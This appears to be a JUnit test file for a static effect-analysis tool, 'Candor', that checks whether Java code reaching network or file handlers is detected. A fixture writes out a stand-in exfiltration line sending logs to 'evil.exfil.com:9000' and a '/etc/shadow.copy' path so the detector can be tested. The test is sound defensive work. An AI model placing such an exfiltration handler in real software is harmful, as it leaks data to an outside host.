package io.poly.candor;

import io.poly.candor.model.EffectSet;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static io.poly.candor.TestCompiler.compile;
import static io.poly.candor.TestCompiler.rm;

import java.nio.file.Path;
import java.util.Map;
import java.util.TreeSet;
import org.junit.jupiter.api.Test;

/**
 * Round-15 teeth: the logging-handler literal-surface EVASION fix (SocketHandler host / FileHandler path must
 * reach the AS-EFF-008 surface), the method-ref/ctor-ref &lt;clinit&gt; silent-pure, and the new framework
 * roots (Spring OncePerRequestFilter, GCP Cloud Functions) + a decoy.
 *
 * <p>Originally review round 15 (Round15FixesTest).
 */
class HandlerSurfaceAndMethodRefClinitTest {

    /** A SocketHandler(host,port) host and a FileHandler(path) path must reach the AS-EFF-008 surface — else
     *  a forbidden exfil host/path is invisible and a benign co-located literal masks it (gate evasion). */
    @Test
    void loggingHandlerHostAndPathSurfaced() throws Exception {
        Path cls = compile(Map.of("app/A.java", String.join("\n",
            "package app;",
            "import java.util.logging.*;",
            "public class A {",
            "  void net() throws Exception { new SocketHandler(\"evil.exfil.com\", 9000).publish(null); }",
            "  void fs() throws Exception { new FileHandler(\"/etc/shadow.copy\").publish(null); }",
            "}")));
        try {
            Map<String, EffectSet> r = Candor.runScan(cls);
            assertTrue(r.getOrDefault("app.A.net", EffectSet.empty()).toNames().contains("Net"), "SocketHandler is Net");
            assertTrue(AnalysisState.ctx().hostsDirect.getOrDefault("app.A.net", new TreeSet<>()).contains("evil.exfil.com:9000"),
                    "the SocketHandler host must be surfaced, got " + AnalysisState.ctx().hostsDirect.get("app.A.net"));
            assertTrue(r.getOrDefault("app.A.fs", EffectSet.empty()).toNames().contains("Fs"), "FileHandler is Fs");
            assertTrue(AnalysisState.ctx().pathsDirect.getOrDefault("app.A.fs", new TreeSet<>()).contains("/etc/shadow.copy"),
                    "the FileHandler path must be surfaced, got " + AnalysisState.ctx().pathsDirect.get("app.A.fs"));
        } finally { rm(cls.getParent()); }
    }

    /** A static method-ref / ctor-ref to a class with an effectful <clinit> (but a pure referenced body)
     *  triggers the class load → its <clinit> effect must reach the use site. */
    @Test
    void methodRefTriggersClinit() throws Exception {
        Path cls = compile(Map.of("app/A.java", String.join("\n",
            "package app;",
            "import java.util.function.*;",
            "public class A {",
            "  static class H { static { try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} }",
            "                   static String doNothing(){ return null; } }",
            "  Supplier<String> use(){ return H::doNothing; }",   // ref triggers H.<clinit> (Net)
            "}")));
        try {
            Map<String, EffectSet> r = Candor.runScan(cls);
            assertTrue(r.getOrDefault("app.A.use", EffectSet.empty()).toNames().contains("Net"),
                    "a method-ref must trigger the class's <clinit> effect, got " + r.get("app.A.use"));
        } finally { rm(cls.getParent()); }
    }

    /** Spring OncePerRequestFilter.doFilterInternal + GCP HttpFunction.service are container-invoked roots;
     *  a non-implementor decoy is NOT rooted. */
    @Test
    void newFrameworkRootsRooted() throws Exception {
        Path cls = compile(Map.ofEntries(
            Map.entry("jakarta/servlet/Filter.java", "package jakarta.servlet; public interface Filter {}"),
            Map.entry("org/springframework/web/filter/OncePerRequestFilter.java",
                "package org.springframework.web.filter; public abstract class OncePerRequestFilter implements jakarta.servlet.Filter { protected abstract void doFilterInternal(Object req, Object resp, Object chain); }"),
            Map.entry("com/google/cloud/functions/HttpFunction.java",
                "package com.google.cloud.functions; public interface HttpFunction { void service(Object req, Object resp); }"),
            Map.entry("app/A.java", String.join("\n",
                "package app;",
                "class F extends org.springframework.web.filter.OncePerRequestFilter {",
                "  protected void doFilterInternal(Object req, Object resp, Object chain){ try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} } }",
                "class Fn implements com.google.cloud.functions.HttpFunction {",
                "  public void service(Object req, Object resp){ try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} } }",
                "class NotAFilter { public void doFilterInternal(Object req, Object resp, Object chain){ try{new java.net.Socket(\"h\",80).close();}catch(Exception e){} } }",
                "public class A {}"))));
        try {
            Candor.runScan(cls);
            assertTrue(AnalysisState.ctx().entryPoints.contains("app.F.doFilterInternal"), "OncePerRequestFilter must be rooted");
            assertTrue(AnalysisState.ctx().entryPoints.contains("app.Fn.service"), "GCP HttpFunction must be rooted");
            assertFalse(AnalysisState.ctx().entryPoints.contains("app.NotAFilter.doFilterInternal"),
                    "a non-implementor doFilterInternal must NOT be over-rooted");
        } finally { rm(cls.getParent()); }
    }
}
